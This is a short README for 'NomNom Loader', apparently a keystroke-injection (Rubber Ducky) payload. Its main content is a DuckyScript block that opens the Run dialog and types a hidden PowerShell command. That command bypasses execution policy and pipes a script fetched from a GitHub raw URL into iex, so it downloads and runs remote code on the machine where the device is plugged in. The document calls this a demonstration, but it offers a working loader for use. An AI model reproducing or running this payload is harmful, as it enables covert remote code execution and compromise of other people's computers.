  # NomNom Loader ( ⚠️ STILL UNDER WORK )

## Overview
**NomNom Loader** is a DuckyScript payload that launches a hidden PowerShell process and executes a remote script hosted on GitHub.

It is designed as a basic remote execution loader for demonstration purposes.

---

## Payload

```ducky
DELAY 600
GUI r
DELAY 300

STRING powershell -windowstyle hidden -ExecutionPolicy Bypass -command "Invoke-RestMethod https://raw.githubusercontent.com/swiftglitxh/DuckyScripts/main/NomNom/copycat.ps1 | iex"

DELAY 200
ENTER
